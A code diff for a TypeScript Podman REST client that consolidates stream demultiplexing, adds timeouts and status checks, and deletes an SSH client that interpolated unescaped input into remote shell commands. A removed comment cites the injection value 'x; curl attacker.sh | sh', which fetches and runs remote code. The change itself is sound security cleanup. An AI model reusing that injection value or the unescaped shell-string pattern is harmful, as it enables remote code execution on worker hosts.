@@ -1,10 +1,24 @@
+/**
+ * The Podman REST API client. Nothing here shells out.
+ *
+ * There used to be an `SSHPodmanClient` alongside `PodmanClient` that ran
+ * `podman ps`, `podman logs`, `podman rmi` and the rest as command *strings*
+ * over SSH. Its command builders were deleted years-of-commits ago for
+ * interpolating unescaped user input into a remote shell; what remained was a
+ * 154-line class with exactly one consumer, `/api/workers/[id]/reconnect`,
+ * which used it to run one `podman ps` as a connectivity probe. Ten of its
+ * twelve methods were unreachable.
+ *
+ * It is gone rather than trimmed: a second, weaker way to reach a worker is a
+ * trap for whoever needs one next, and mTLS over the REST API is the path that
+ * should be taken. The reconnect route now runs its own one-line probe through
+ * `executeSSHCommand`, which is where SSH belongs.
+ */
 import https from 'https';
 import http from 'http';
 import tls from 'tls';
-import { readFileSync, existsSync } from 'fs';
+import { readFileSync } from 'fs';
 import { URL } from 'url';
-import { executeSSHCommand, testSSHConnection, type SSHConnectionConfig } from './ssh';
-import WebSocket from 'ws';
 
 /**
  * Resolves a cert value that may be either PEM content (starts with "-----")
@@ -51,6 +65,18 @@ export class PodmanApiError extends Error {
     this.name = 'PodmanApiError';
   }
 
+  /**
+   * Whether an unknown thrown value is a Podman refusal with this status.
+   *
+   * The call sites used to ask `err.message.includes('404')`, which is true of
+   * any error whose text happens to contain those three digits — a pull of
+   * `nginx:1.404`, say — and which only works at all because the message
+   * embeds the status. This reads the field that exists for the purpose.
+   */
+  static hasStatus(error: unknown, status: number): boolean {
+    return error instanceof PodmanApiError && error.status === status;
+  }
+
   /** Build one from a raw response body, digging out the human-readable part. */
   static fromResponse(status: number, body: string): PodmanApiError {
     let detail = body.trim();
@@ -66,12 +92,55 @@ export class PodmanApiError extends Error {
 }
 
 /**
+ * A streaming reader for Podman's multiplexed output.
+ *
+ * Without a TTY, both the exec and the logs endpoints prefix every write with
+ * an 8-byte header: byte 0 is the stream (1 = stdout, 2 = stderr) and bytes 4–7
+ * are the payload length, big-endian. With a TTY there are no headers at all —
+ * the pty has already merged the streams — so the chunk is passed through.
+ *
+ * Buffering belongs here rather than in each caller: a frame can be split
+ * across TCP reads, and treating a partial header as payload puts binary
+ * garbage on the user's terminal. There were five hand-written copies of this
+ * loop in this file — two in the exec paths, two in the logs paths, and the
+ * one-shot `demultiplexExecStream` below — and the two logs copies had already
+ * drifted, discarding the stream byte so stderr came back labelled as stdout.
+ */
+export function createFrameReader(options: {
+  tty: boolean;
+  onStdout: (payload: Buffer) => void;
+  onStderr?: (payload: Buffer) => void;
+}): (chunk: Buffer) => void {
+  let buffered = Buffer.alloc(0);
+
+  return (chunk: Buffer) => {
+    if (options.tty) {
+      options.onStdout(chunk);
+      return;
+    }
+
+    buffered = Buffer.concat([buffered, chunk]);
+
+    while (buffered.length >= 8) {
+      const streamType = buffered[0];
+      const size = buffered.readUInt32BE(4);
+      if (buffered.length < 8 + size) break;
+
+      const payload = buffered.subarray(8, 8 + size);
+      buffered = buffered.subarray(8 + size);
+
+      if (streamType === 2 && options.onStderr) options.onStderr(payload);
+      else options.onStdout(payload);
+    }
+  };
+}
+
+/**
  * Split Podman's multiplexed exec output into the two streams.
  *
- * Without a TTY the daemon prefixes every write with an 8-byte header: byte 0
- * is the stream (1 = stdout, 2 = stderr) and bytes 4–7 are the payload length,
- * big-endian. A trailing partial frame is kept rather than dropped — it is
- * output that was written, just cut short.
+ * The one-shot form, for a response that has already been read whole. A
+ * trailing partial frame is kept rather than dropped — it is output that was
+ * written, just cut short.
  */
 export function demultiplexExecStream(raw: Buffer): { stdout: string; stderr: string } {
   const out: Buffer[] = [];
@@ -103,6 +172,9 @@ export function demultiplexExecStream(raw: Buffer): { stdout: string; stderr: st
   };
 }
 
+/** Prevents a hung request from blocking the metrics scheduler. */
+const REQUEST_TIMEOUT_MS = 30_000;
+
 export interface PodmanConfig {
   apiUrl: string;
   caCert?: string;
@@ -117,13 +189,6 @@ export interface PodmanConfig {
    * it, from ALLOW_INSECURE_PODMAN.
    */
   insecureSkipVerify?: boolean;
-}
-
-export interface SSHPodmanConfig {
-  host: string;
-  port: number;
-  username: string;
-  privateKey: string;
 }
 
 export interface Container {
@@ -342,32 +407,51 @@ export class PodmanClient {
     return this.httpAgent ?? undefined;
   }
 
-  private async request<T>(path: string, options: RequestInit = {}): Promise<T> {
+  /**
+   * The Node request module and options for a path on this worker.
+   *
+   * `fetch` is not used anywhere in this class: it has no way to take a custom
+   * agent, and the agent is what carries the mTLS client certificate. That left
+   * every method building the same `{hostname, port, path, method, headers,
+   * agent}` object by hand — five copies, which is how two of them ended up
+   * with no timeout at all while `request` had two.
+   */
+  private plan(
+    path: string,
+    method: string,
+    extra: { headers?: Record<string, string | number>; timeoutMs?: number | null } = {},
+  ) {
     const url = `${this.baseUrl}${path}`;
+    const parsed = new URL(url);
+    return {
+      module: parsed.protocol === 'https:' ? https : http,
+      options: {
+        hostname: parsed.hostname,
+        port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
+        path: parsed.pathname + parsed.search,
+        method,
+        headers: extra.headers ?? {},
+        agent: this.getAgent(url),
+        // `null` means "no socket timeout", which is what a followed log stream
+        // needs: it is idle by design between lines.
+        ...(extra.timeoutMs === null ? {} : { timeout: extra.timeoutMs ?? REQUEST_TIMEOUT_MS }),
+      },
+    };
+  }
 
-    // Use Node.js https/http module directly to properly support custom agents
-    // (global fetch in Node.js 18+ does not support the 'agent' option)
-    const nodeUrl = new URL(url);
-    const agent = this.getAgent(url);
+  private async request<T>(path: string, options: RequestInit = {}): Promise<T> {
     const method = (options.method as string) || 'GET';
     const body = options.body as string | undefined;
 
-    return new Promise<T>((resolve, reject) => {
-      const reqModule = nodeUrl.protocol === 'https:' ? https : http;
-      const reqOptions = {
-        hostname: nodeUrl.hostname,
-        port: nodeUrl.port || (nodeUrl.protocol === 'https:' ? 443 : 80),
-        path: nodeUrl.pathname + nodeUrl.search,
-        method,
-        headers: {
-          'Content-Type': 'application/json',
-          ...(options.headers as Record<string, string> || {}),
-          ...(body ? { 'Content-Length': Buffer.byteLength(body) } : {}),
-        },
-        agent,
-        timeout: 30_000, // 30 s — prevents hung requests from blocking the metrics scheduler
-      };
+    const { module: reqModule, options: reqOptions } = this.plan(path, method, {
+      headers: {
+        'Content-Type': 'application/json',
+        ...(options.headers as Record<string, string> || {}),
+        ...(body ? { 'Content-Length': Buffer.byteLength(body) } : {}),
+      },
+    });
 
+    return new Promise<T>((resolve, reject) => {
       const req = reqModule.request(reqOptions, (res) => {
         let data = '';
         res.on('data', (chunk) => { data += chunk; });
@@ -391,9 +475,11 @@ export class PodmanClient {
         });
       });
 
+      // A second timer, because the socket `timeout` above only fires on
+      // *inactivity*: a worker dribbling one byte a second keeps resetting it.
       const absoluteTimeout = setTimeout(() => {
         req.destroy(new Error(`Podman API request absolute timeout: ${method} ${path}`));
-      }, 30_000);
+      }, REQUEST_TIMEOUT_MS);
 
       req.on('close', () => clearTimeout(absoluteTimeout));
 
@@ -419,37 +505,22 @@ export class PodmanClient {
     body: Buffer,
     contentType = 'application/x-tar',
   ): Promise<void> {
-    const url = `${this.baseUrl}${path}`;
-    const nodeUrl = new URL(url);
-    const agent = this.getAgent(url);
+    const { module: reqModule, options: reqOptions } = this.plan(path, method, {
+      headers: { 'Content-Type': contentType, 'Content-Length': body.length },
+    });
 
     return new Promise<void>((resolve, reject) => {
-      const reqModule = nodeUrl.protocol === 'https:' ? https : http;
-      const req = reqModule.request(
-        {
-          hostname: nodeUrl.hostname,
-          port: nodeUrl.port || (nodeUrl.protocol === 'https:' ? 443 : 80),
-          path: nodeUrl.pathname + nodeUrl.search,
-          method,
-          headers: {
-            'Content-Type': contentType,
-            'Content-Length': body.length,
-          },
-          agent,
-          timeout: 30_000,
-        },
-        (res) => {
-          let data = '';
-          res.on('data', (chunk) => { data += chunk; });
-          res.on('end', () => {
-            if (res.statusCode && res.statusCode >= 400) {
-              reject(PodmanApiError.fromResponse(res.statusCode, data));
-              return;
-            }
-            resolve();
-          });
-        },
-      );
+      const req = reqModule.request(reqOptions, (res) => {
+        let data = '';
+        res.on('data', (chunk) => { data += chunk; });
+        res.on('end', () => {
+          if (res.statusCode && res.statusCode >= 400) {
+            reject(PodmanApiError.fromResponse(res.statusCode, data));
+            return;
+          }
+          resolve();
+        });
+      });
 
       req.on('timeout', () => {
         req.destroy(new Error(`Podman API request timed out: ${method} ${path}`));
@@ -509,9 +580,9 @@ export class PodmanClient {
   async systemDf(): Promise<any> {
     try {
       return await this.request<any>('/libpod/system/df');
-    } catch (err: any) {
+    } catch (err: unknown) {
       // Fallback to Docker-compatible endpoint if libpod returns 404
-      if (err?.message?.includes('404')) {
+      if (PodmanApiError.hasStatus(err, 404)) {
         const dockerDf = await this.request<any>('/system/df');
         return {
           ImagesDiskUsage: (dockerDf.Images || []).map((img: any) => ({
@@ -555,9 +626,9 @@ export class PodmanClient {
         return res.split('\n').filter(l => l.trim()).map(l => JSON.parse(l));
       }
       return Array.isArray(res) ? res : [res];
-    } catch (err: any) {
+    } catch (err: unknown) {
       // Fallback to Docker-compatible endpoint if libpod returns 404
-      if (err?.message?.includes('404')) {
+      if (PodmanApiError.hasStatus(err, 404)) {
         const res = await this.request<any>(`/events?${params}`);
         if (typeof res === 'string') {
           return res.split('\n').filter(l => l.trim()).map(l => JSON.parse(l));
@@ -764,22 +835,20 @@ export class PodmanClient {
         method: 'POST',
         body: JSON.stringify({ Name: name, Driver: driver }),
       });
-    } catch (e: any) {
-      // Network may already exist
-      if (e.message?.includes('already exists') || e.message?.includes('409')) {
-        return { Id: name };
-      }
+    } catch (e: unknown) {
+      // Already there is the same outcome as having just made it. The name is
+      // the id for Podman networks, so there is nothing further to look up.
+      if (PodmanApiError.hasStatus(e, 409)) return { Id: name };
       throw e;
     }
   }
 
+  /** Removing a network that is already gone is a success, not a failure. */
   async removeNetwork(name: string): Promise<void> {
     try {
       await this.request(`/networks/${name}`, { method: 'DELETE' });
-    } catch (e: any) {
-      if (!e.message?.includes('not found') && !e.message?.includes('404')) {
-        throw e;
-      }
+    } catch (e: unknown) {
+      if (!PodmanApiError.hasStatus(e, 404)) throw e;
     }
   }
 
@@ -796,10 +865,10 @@ export class PodmanClient {
         method: 'POST',
         body: JSON.stringify({ Container: containerId }),
       });
-    } catch (e: any) {
-      if (!e.message?.includes('not found') && !e.message?.includes('404')) {
-        throw e;
-      }
+    } catch (e: unknown) {
+      // Neither the network nor the attachment being there is the outcome
+      // asked for.
+      if (!PodmanApiError.hasStatus(e, 404)) throw e;
     }
   }
 
@@ -847,64 +916,30 @@ export class PodmanClient {
     if (options.tail) params.append('tail', options.tail.toString());
     if (options.timestamps) params.append('timestamps', '1');
 
-    const url = `${this.baseUrl}/containers/${id}/logs?${params}`;
-    const nodeUrl = new URL(url);
-    const agent = this.getAgent(url);
-    const reqModule = nodeUrl.protocol === 'https:' ? https : http;
+    // This had no timeout of any kind, so a worker that accepted the connection
+    // and then went quiet held the request open indefinitely.
+    const { module: reqModule, options: reqOptions } = this.plan(
+      `/containers/${id}/logs?${params}`,
+      'GET',
+      { headers: { 'Content-Type': 'application/json' } },
+    );
 
     return new Promise((resolve, reject) => {
-      const reqOptions = {
-        hostname: nodeUrl.hostname,
-        port: nodeUrl.port || (nodeUrl.protocol === 'https:' ? 443 : 80),
-        path: nodeUrl.pathname + nodeUrl.search,
-        method: 'GET',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        agent,
-      };
-
       const req = reqModule.request(reqOptions, (res) => {
         const chunks: Buffer[] = [];
-
-        res.on('data', (chunk: Buffer) => {
-          chunks.push(chunk);
-        });
-
+        res.on('data', (chunk: Buffer) => chunks.push(chunk));
         res.on('end', () => {
-          const data = Buffer.concat(chunks);
-          
-          // Parse Docker multiplexed stream format
-          // Each frame: [stream_type:1][padding:3][size:4-big-endian][payload:size]
-          let result = '';
-          let offset = 0;
-
-          while (offset + 8 <= data.length) {
-            const size = data.readUInt32BE(offset + 4);
-            offset += 8;
-
-            if (offset + size > data.length) {
-              // Incomplete frame, append remainder as raw text
-              result += data.subarray(offset - 8).toString('utf-8');
-              break;
-            }
-
-            const payload = data.subarray(offset, offset + size).toString('utf-8');
-            offset += size;
-            result += payload;
-          }
-
-          // If no frames were parsed, treat as raw text
-          if (offset === 0 && data.length > 0) {
-            result = data.toString('utf-8');
-          }
-
-          resolve(result);
+          // Both streams, interleaved in the order Podman wrote them — the
+          // caller asked for stdout *and* stderr and renders one text blob.
+          const { stdout, stderr } = demultiplexExecStream(Buffer.concat(chunks));
+          resolve(stderr ? stdout + stderr : stdout);
         });
-
         res.on('error', reject);
       });
 
+      req.on('timeout', () => {
+        req.destroy(new Error(`Podman API request timed out: GET container logs`));
+      });
       req.on('error', reject);
       req.end();
     });
@@ -931,72 +966,29 @@ export class PodmanClient {
     if (options.follow !== false) params.append('follow', '1');
     params.append('stream', '1');
 
-    const url = `${this.baseUrl}/containers/${id}/logs?${params}`;
-    const nodeUrl = new URL(url);
-    const agent = this.getAgent(url);
-    const reqModule = nodeUrl.protocol === 'https:' ? https : http;
-
-    const reqOptions = {
-      hostname: nodeUrl.hostname,
-      port: nodeUrl.port || (nodeUrl.protocol === 'https:' ? 443 : 80),
-      path: nodeUrl.pathname + nodeUrl.search,
-      method: 'GET',
-      headers: {
-        'Connection': 'keep-alive',
-      },
-      agent,
-    };
+    // `timeoutMs: null` — a followed log stream is idle by design between
+    // lines, so a socket inactivity timeout would kill exactly the sessions
+    // that are working. The caller closes it via the returned `abort`.
+    const { module: reqModule, options: reqOptions } = this.plan(
+      `/containers/${id}/logs?${params}`,
+      'GET',
+      { headers: { Connection: 'keep-alive' }, timeoutMs: null },
+    );
 
     const req = reqModule.request(reqOptions, (res) => {
-      const chunks: Buffer[] = [];
-      let buffer = Buffer.alloc(0);
-
-      const processBuffer = () => {
-        // Process Docker multiplexed stream format
-        // Each frame: [stream_type:1][padding:3][size:4-big-endian][payload:size]
-        while (buffer.length >= 8) {
-          const size = buffer.readUInt32BE(4);
-          
-          if (buffer.length < 8 + size) {
-            // Wait for more data
-            break;
-          }
-
-          const payload = buffer.subarray(8, 8 + size).toString('utf-8');
-          buffer = buffer.subarray(8 + size);
-
-          // Send each line
-          const lines = payload.split('\n');
-          for (const line of lines) {
-            if (line) {
-              onData(line);
-            }
-          }
+      const emitLines = (payload: Buffer) => {
+        for (const line of payload.toString('utf-8').split('\n')) {
+          if (line) onData(line);
         }
       };
 
-      res.on('data', (chunk: Buffer) => {
-        buffer = Buffer.concat([buffer, chunk]);
-        processBuffer();
-      });
+      // Both streams go to the same callback: the caller renders one log view
+      // and asked for stdout and stderr together.
+      const read = createFrameReader({ tty: false, onStdout: emitLines, onStderr: emitLines });
 
-      res.on('end', () => {
-        // Process any remaining data as raw text
-        if (buffer.length > 0) {
-          const remaining = buffer.toString('utf-8');
-          const lines = remaining.split('\n');
-          for (const line of lines) {
-            if (line) {
-              onData(line);
-            }
-          }
-        }
-        onEnd();
-      });
-
-      res.on('error', (err) => {
-        onError(err);
-      });
+      res.on('data', read);
+      res.on('end', onEnd);
+      res.on('error', onError);
     });
 
     req.on('error', (err) => {
@@ -1065,25 +1057,24 @@ export class PodmanClient {
     });
     const execId = created.Id;
 
-    const url = `${this.baseUrl}/exec/${execId}/start`;
-    const nodeUrl = new URL(url);
-    const reqModule = nodeUrl.protocol === 'https:' ? https : http;
     const body = JSON.stringify({ Detach: false, Tty: tty });
-
-    return new Promise<ExecStream>((resolve, reject) => {
-      const req = reqModule.request({
-        hostname: nodeUrl.hostname,
-        port: nodeUrl.port || (nodeUrl.protocol === 'https:' ? 443 : 80),
-        path: nodeUrl.pathname,
-        method: 'POST',
+    // No timeout: an interactive session is idle whenever the user is thinking.
+    const { module: reqModule, options: reqOptions } = this.plan(
+      `/exec/${execId}/start`,
+      'POST',
+      {
         headers: {
           'Content-Type': 'application/json',
           'Content-Length': Buffer.byteLength(body),
           Connection: 'Upgrade',
           Upgrade: 'tcp',
         },
-        agent: this.getAgent(url),
-      });
+        timeoutMs: null,
+      },
+    );
+
+    return new Promise<ExecStream>((resolve, reject) => {
+      const req = reqModule.request(reqOptions);
 
       let settled = false;
       const handlers = {
@@ -1096,36 +1087,14 @@ export class PodmanClient {
         for (const fn of handlers.end.splice(0)) fn();
       };
 
-      /**
-       * Without a TTY, Docker multiplexes the two streams into frames of
-       * `[stream:1][pad:3][len:4 BE][payload]`. Reassembled here rather than in
-       * the caller: a frame can be split across TCP reads, and treating a
-       * partial header as payload puts binary garbage on the user's terminal.
-       */
-      const makeReader = () => {
-        let buffered = Buffer.alloc(0);
-        return (chunk: Buffer) => {
-          if (tty) {
-            for (const fn of handlers.stdout) fn(chunk);
-            return;
-          }
-          buffered = Buffer.concat([buffered, chunk]);
-          while (buffered.length >= 8) {
-            const size = buffered.readUInt32BE(4);
-            if (buffered.length < 8 + size) break;
-            const streamType = buffered[0];
-            const payload = buffered.subarray(8, 8 + size);
-            buffered = buffered.subarray(8 + size);
-            const target = streamType === 2 ? handlers.stderr : handlers.stdout;
-            for (const fn of target) fn(payload);
-          }
-        };
-      };
-
       const attach = (socket: import('net').Socket, head: Buffer) => {
         if (settled) return;
         settled = true;
-        const read = makeReader();
+        const read = createFrameReader({
+          tty,
+          onStdout: (payload) => { for (const fn of handlers.stdout) fn(payload); },
+          onStderr: (payload) => { for (const fn of handlers.stderr) fn(payload); },
+        });
         if (head?.length) read(head);
         socket.on('data', read);
         socket.on('end', emitEnd);
@@ -1194,10 +1163,19 @@ export class PodmanClient {
     });
     const execId = created.Id;
 
-    const url = `${this.baseUrl}/exec/${execId}/start`;
-    const nodeUrl = new URL(url);
-    const reqModule = nodeUrl.protocol === 'https:' ? https : http;
     const body = JSON.stringify({ Detach: false, Tty: tty });
+    // No timeout: a long-running command is silent while it works.
+    const { module: reqModule, options: reqOptions } = this.plan(
+      `/exec/${execId}/start`,
+      'POST',
+      {
+        headers: {
+          'Content-Type': 'application/json',
+          'Content-Length': Buffer.byteLength(body),
+        },
+        timeoutMs: null,
+      },
+    );
 
     const handlers = {
       stdout: [] as Array<(d: Buffer) => void>,
@@ -1206,35 +1184,14 @@ export class PodmanClient {
     };
     const emitEnd = () => { for (const fn of handlers.end.splice(0)) fn(); };
 
-    let buffered = Buffer.alloc(0);
-    const read = (chunk: Buffer) => {
-      if (tty) {
-        for (const fn of handlers.stdout) fn(chunk);
-        return;
-      }
-      buffered = Buffer.concat([buffered, chunk]);
-      while (buffered.length >= 8) {
-        const size = buffered.readUInt32BE(4);
-        if (buffered.length < 8 + size) break;
-        const streamType = buffered[0];
-        const payload = buffered.subarray(8, 8 + size);
-        buffered = buffered.subarray(8 + size);
-        for (const fn of streamType === 2 ? handlers.stderr : handlers.stdout) fn(payload);
-      }
-    };
+    const read = createFrameReader({
+      tty,
+      onStdout: (payload) => { for (const fn of handlers.stdout) fn(payload); },
+      onStderr: (payload) => { for (const fn of handlers.stderr) fn(payload); },
+    });
 
     return new Promise<ExecStream>((resolve, reject) => {
-      const req = reqModule.request({
-        hostname: nodeUrl.hostname,
-        port: nodeUrl.port || (nodeUrl.protocol === 'https:' ? 443 : 80),
-        path: nodeUrl.pathname,
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Content-Length': Buffer.byteLength(body),
-        },
-        agent: this.getAgent(url),
-      });
+      const req = reqModule.request(reqOptions);
 
       req.on('response', (res) => {
         if (res.statusCode && res.statusCode >= 400) {
@@ -1296,26 +1253,17 @@ export class PodmanClient {
 
     const execId = createResult.Id;
 
-    // Step 2: Start exec and capture output
-    const url = `${this.baseUrl}/exec/${execId}/start`;
-    const nodeUrl = new URL(url);
-    const agent = this.getAgent(url);
-    const reqModule = nodeUrl.protocol === 'https:' ? https : http;
+    // Step 2: Start exec and capture output. No timeout — the command decides
+    // how long it takes, and the caller decides whether to wait.
+    const { module: reqModule, options: reqOptions } = this.plan(
+      `/exec/${execId}/start`,
+      'POST',
+      { headers: { 'Content-Type': 'application/json' }, timeoutMs: null },
+    );
 
     const chunks: Buffer[] = [];
 
     await new Promise<void>((resolve, reject) => {
-      const reqOptions = {
-        hostname: nodeUrl.hostname,
-        port: nodeUrl.port || (nodeUrl.protocol === 'https:' ? 443 : 80),
-        path: nodeUrl.pathname,
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        agent,
-      };
-
       const req = reqModule.request(reqOptions, (res) => {
         res.on('data', (chunk: Buffer) => chunks.push(chunk));
         res.on('end', () => resolve());
@@ -1398,165 +1346,6 @@ export class PodmanClient {
   }
 }
 
-export class SSHPodmanClient {
-  private config: SSHPodmanConfig;
-
-  constructor(config: SSHPodmanConfig) {
-    this.config = config;
-  }
-
-  private async exec(command: string): Promise<{ stdout: string; stderr: string; exitCode: number }> {
-    const sshConfig: SSHConnectionConfig = {
-      host: this.config.host,
-      port: this.config.port,
-      username: this.config.username,
-      privateKey: this.config.privateKey,
-    };
-
-    const result = await executeSSHCommand(sshConfig, command);
-    return result;
-  }
-
-  async ping(): Promise<boolean> {
-    try {
-      const result = await this.exec('podman version');
-      return result.exitCode === 0;
-    } catch {
-      return false;
-    }
-  }
-
-  async info(): Promise<any> {
-    const result = await this.exec('podman info --format json');
-    if (result.exitCode !== 0) {
-      throw new Error(`podman info failed: ${result.stderr}`);
-    }
-    return JSON.parse(result.stdout);
-  }
-
-  async listContainers(all: boolean = true): Promise<Container[]> {
-    const result = await this.exec(`podman ps -a --format json`);
-    if (result.exitCode !== 0) {
-      throw new Error(`podman ps failed: ${result.stderr}`);
-    }
-    const lines = result.stdout.trim().split('\n').filter(l => l.trim());
-    if (lines.length === 0) return [];
-    return lines.map(l => JSON.parse(l));
-  }
-
-  async getContainer(id: string): Promise<ContainerInspect> {
-    const result = await this.exec(`podman inspect ${id}`);
-    if (result.exitCode !== 0) {
-      throw new Error(`podman inspect failed: ${result.stderr}`);
-    }
-    const containers = JSON.parse(result.stdout);
-    if (!containers || containers.length === 0) {
-      throw new Error(`Container ${id} not found`);
-    }
-    return containers[0];
-  }
-
-  // `createContainer`, `execContainer` and `resolveImageName` used to live
-  // here. They built `podman run` / `podman exec` command *strings* with the
-  // name, working directory, image, `-e KEY=value` and `-v` arguments
-  // interpolated unquoted, and handed them to `executeSSHCommand`, where the
-  // remote shell interprets them — so an environment value of
-  // `x; curl attacker.sh | sh` would have run as the SSH user on the worker.
-  // Nothing called them: the only consumer of this class pings and lists. They
-  // are deleted rather than escaped, because a correct-but-unused copy of a
-  // command builder is a trap for whoever needs one next, and the REST client
-  // above is the path that should be taken. See the module comment and ssh.ts.
-
-  async startContainer(id: string): Promise<void> {
-    const result = await this.exec(`podman start ${id}`);
-    if (result.exitCode !== 0) {
-      throw new Error(`podman start failed: ${result.stderr}`);
-    }
-  }
-
-  async stopContainer(id: string, timeout: number = 10): Promise<void> {
-    const result = await this.exec(`podman stop -t ${timeout} ${id}`);
-    if (result.exitCode !== 0) {
-      throw new Error(`podman stop failed: ${result.stderr}`);
-    }
-  }
-
-  async restartContainer(id: string, timeout: number = 10): Promise<void> {
-    const result = await this.exec(`podman restart -t ${timeout} ${id}`);
-    if (result.exitCode !== 0) {
-      throw new Error(`podman restart failed: ${result.stderr}`);
-    }
-  }
-
-  async removeContainer(id: string, force: boolean = false): Promise<void> {
-    const result = await this.exec(`podman rm ${force ? '-f' : ''} ${id}`);
-    if (result.exitCode !== 0) {
-      throw new Error(`podman rm failed: ${result.stderr}`);
-    }
-  }
-
-  async listImages(): Promise<Image[]> {
-    const result = await this.exec('podman images --format json');
-    if (result.exitCode !== 0) {
-      throw new Error(`podman images failed: ${result.stderr}`);
-    }
-    const lines = result.stdout.trim().split('\n').filter(l => l.trim());
-    if (lines.length === 0) return [];
-    return lines.map(l => JSON.parse(l));
-  }
-
-  async removeImage(id: string, force: boolean = false): Promise<void> {
-    const result = await this.exec(`podman rmi ${force ? '-f' : ''} ${id}`);
-    if (result.exitCode !== 0) {
-      throw new Error(`podman rmi failed: ${result.stderr}`);
-    }
-  }
-
-  async pullImage(name: string, tag: string = 'latest'): Promise<void> {
-    const imageName = name.includes(':') ? name : `${name}:${tag}`;
-    const result = await this.exec(`podman pull ${imageName}`);
-    if (result.exitCode !== 0) {
-      throw new Error(`podman pull failed: ${result.stderr}`);
-    }
-  }
-
-  async getContainerLogs(
-    id: string,
-    options: {
-      stdout?: boolean;
-      stderr?: boolean;
-      tail?: number;
-      timestamps?: boolean;
-    } = {}
-  ): Promise<string> {
-    let cmd = `podman logs`;
-    
-    if (options.tail) {
-      cmd += ` --tail ${options.tail}`;
-    }
-    
-    if (options.timestamps) {
-      cmd += ` -t`;
-    }
-    
-    cmd += ` ${id}`;
-    
-    const result = await this.exec(cmd);
-    if (result.exitCode !== 0) {
-      throw new Error(`podman logs failed: ${result.stderr}`);
-    }
-    
-    return result.stdout;
-  }
-
-  destroy(): void {
-  }
-}
-
 export function createPodmanClient(config: PodmanConfig): PodmanClient {
   return new PodmanClient(config);
-}
-
-export function createSSHPodmanClient(config: SSHPodmanConfig): SSHPodmanClient {
-  return new SSHPodmanClient(config);
 }
